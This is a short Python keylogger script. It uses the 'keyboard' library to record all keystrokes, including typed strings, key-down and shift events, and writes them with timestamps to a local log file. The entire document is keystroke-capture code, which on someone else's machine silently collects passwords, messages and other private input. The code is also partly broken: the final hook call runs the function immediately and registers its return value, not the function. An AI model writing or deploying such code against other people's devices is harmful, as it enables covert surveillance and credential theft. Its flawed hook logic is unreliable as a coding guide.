import keyboard
import datetime

#opens a textfile to write the data. (!!!write mode currently on "w" should later be changed into "a"!!!)
file = open("./keylog.txt", "w", encoding = "utf-8")

#defines function (on_key) tracking keys on wished format
def on_key():
    #------------------------------writes current datetime in the beginning of log entry
    now = datetime.datetime.today()
    file.write(str(now))
    #------------------------------
    
    events = keyboard.record() #adds all keyboard events in a list
    keywords =list()
    allkeys = list()


    #----loop gets just the value of any keyboard event appends it to a list and then writes it on the logfile
    for i in keyboard.get_typed_strings(events, allow_backspace= True):
        keywords.append(i)
        file.write("\n")
        file.write(i)
    #----------------------------------------
    # loop that gets the value of the keyboard event this time though "shift" presses are also being recorded and appended in list (allkeys)
    for i in events:
        istr = str(i)
        if "down" in istr and "shift" not in istr:
            istr = istr.strip("KeyboardEvent").split(" ")[0]+")"
            allkeys.append(istr)

        elif "shift" in istr:
            istr = istr.strip("KeyboardEvent ")
            allkeys.append(istr)

        else:
            continue
    #------------------------------------------
    
    # write lists to file and "end" datetime---
    file.write("\n")
    file.write(str(keywords))
    file.write("\n")
    file.write(str(allkeys))
    file.write("\n")
    file.write(str(now))
    #------------------------------------------




keyboard.hook(on_key())
